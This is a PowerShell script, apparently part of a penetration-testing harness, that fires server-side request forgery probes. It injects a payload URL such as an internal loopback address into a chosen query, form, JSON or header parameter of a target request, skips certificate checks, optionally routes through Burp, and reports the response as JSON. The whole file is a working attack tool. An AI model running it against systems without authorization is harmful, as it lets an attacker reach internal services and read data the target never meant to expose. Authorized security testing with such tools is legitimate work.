<#
  ssrf_runner.ps1 — fires one SSRF probe and emits a single-line JSON result.

  Input: a JSON blob on stdin (single line) with:
    {
      "method":   "GET" | "POST" | ...,
      "url":      "https://target/api/endpoint",
      "headers":  { "Header": "value", ... },
      "body":     "raw body string or empty",
      "param":    { "name": "url", "location": "query|body-form|body-json|header" },
      "payload":  "http://127.0.0.1:22/",
      "timeout":  10,
      "proxy":    "http://127.0.0.1:8080"  (optional — route via Burp)
    }

  Output (stdout, one JSON line):
    {
      "status": 200 | 0,
      "elapsed_ms": 123,
      "headers": {...},
      "body_excerpt": "first 4096 chars",
      "redirect": "<Location header if any>",
      "error": null | "message"
    }
#>

[CmdletBinding()]
param()

$ErrorActionPreference = 'Continue'
# Allow old TLS handshakes against weird internal services.
try {
  [Net.ServicePointManager]::SecurityProtocol =
    [Net.SecurityProtocolType]::Tls12 -bor
    [Net.SecurityProtocolType]::Tls11 -bor
    [Net.SecurityProtocolType]::Tls
} catch {}

$raw = [Console]::In.ReadToEnd()
if ([string]::IsNullOrWhiteSpace($raw)) {
  '{"status":0,"elapsed_ms":0,"headers":{},"body_excerpt":"","redirect":"","error":"no input"}'
  exit 1
}

try {
  $req = $raw | ConvertFrom-Json
} catch {
  '{"status":0,"elapsed_ms":0,"headers":{},"body_excerpt":"","redirect":"","error":"bad json"}'
  exit 1
}

function Set-ParamValue {
  param(
    [string]$Url, [string]$Body, $Headers, $ParamSpec, [string]$Payload
  )
  $name = $ParamSpec.name
  $loc = $ParamSpec.location
  $uri = [Uri]$Url

  switch ($loc) {
    'query' {
      $u = [System.UriBuilder]::new($Url)
      $qs = [System.Web.HttpUtility]::ParseQueryString($u.Query)
      $qs[$name] = $Payload
      $u.Query = $qs.ToString()
      return @{ Url = $u.Uri.AbsoluteUri; Body = $Body; Headers = $Headers }
    }
    'body-form' {
      $pairs = @{}
      if ($Body) {
        foreach ($p in $Body.Split('&')) {
          $kv = $p.Split('=', 2)
          if ($kv.Length -eq 2) { $pairs[$kv[0]] = $kv[1] }
        }
      }
      $pairs[$name] = [System.Uri]::EscapeDataString($Payload)
      $newBody = ($pairs.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join '&'
      return @{ Url = $Url; Body = $newBody; Headers = $Headers }
    }
    'body-json' {
      try {
        $obj = $Body | ConvertFrom-Json -AsHashtable -ErrorAction Stop
      } catch {
        $obj = @{}
      }
      $obj[$name] = $Payload
      $newBody = $obj | ConvertTo-Json -Compress -Depth 10
      return @{ Url = $Url; Body = $newBody; Headers = $Headers }
    }
    'header' {
      $h = @{}
      if ($Headers) { foreach ($k in $Headers.PSObject.Properties.Name) { $h[$k] = $Headers.$k } }
      $h[$name] = $Payload
      return @{ Url = $Url; Body = $Body; Headers = $h }
    }
    default {
      return @{ Url = $Url; Body = $Body; Headers = $Headers }
    }
  }
}

Add-Type -AssemblyName System.Web | Out-Null

$prepared = Set-ParamValue -Url $req.url -Body $req.body `
  -Headers $req.headers -ParamSpec $req.param -Payload $req.payload

$hdrs = @{}
if ($prepared.Headers) {
  if ($prepared.Headers -is [hashtable]) {
    $hdrs = $prepared.Headers
  } else {
    foreach ($k in $prepared.Headers.PSObject.Properties.Name) {
      $hdrs[$k] = $prepared.Headers.$k
    }
  }
}
# Strip hop-by-hop / PS-controlled headers.
foreach ($drop in @('Host','Content-Length','Connection','Accept-Encoding')) {
  if ($hdrs.ContainsKey($drop)) { [void]$hdrs.Remove($drop) }
}

$sw = [System.Diagnostics.Stopwatch]::StartNew()
$status = 0
$respHeaders = @{}
$bodyExcerpt = ''
$redirect = ''
$err = $null

try {
  $params = @{
    Uri                  = $prepared.Url
    Method               = $req.method
    Headers              = $hdrs
    TimeoutSec           = [int]$req.timeout
    MaximumRedirection   = 0
    SkipHttpErrorCheck   = $true
    ErrorAction          = 'Stop'
  }
  if ($req.proxy) { $params.Proxy = $req.proxy }
  if ($prepared.Body -and $req.method -ne 'GET' -and $req.method -ne 'HEAD') {
    $params.Body = $prepared.Body
  }
  # PS 7+: -SkipCertificateCheck; PS 5.1 would need a callback override.
  if ($PSVersionTable.PSVersion.Major -ge 6) {
    $params.SkipCertificateCheck = $true
  }

  $resp = Invoke-WebRequest @params
  $status = [int]$resp.StatusCode
  foreach ($h in $resp.Headers.GetEnumerator()) {
    $v = $h.Value
    if ($v -is [array]) { $v = ($v -join ', ') }
    $respHeaders[$h.Key] = "$v"
  }
  if ($respHeaders.ContainsKey('Location')) { $redirect = $respHeaders['Location'] }
  $content = ''
  if ($resp.Content -is [byte[]]) {
    $content = [System.Text.Encoding]::UTF8.GetString($resp.Content)
  } else {
    $content = [string]$resp.Content
  }
  if ($content.Length -gt 4096) {
    $bodyExcerpt = $content.Substring(0, 4096)
  } else {
    $bodyExcerpt = $content
  }
} catch {
  $err = $_.Exception.Message
  if ($_.Exception.Response) {
    try { $status = [int]$_.Exception.Response.StatusCode } catch {}
  }
}

$sw.Stop()

$out = [ordered]@{
  status       = $status
  elapsed_ms   = [int]$sw.ElapsedMilliseconds
  headers      = $respHeaders
  body_excerpt = $bodyExcerpt
  redirect     = $redirect
  error        = $err
}
$out | ConvertTo-Json -Compress -Depth 6
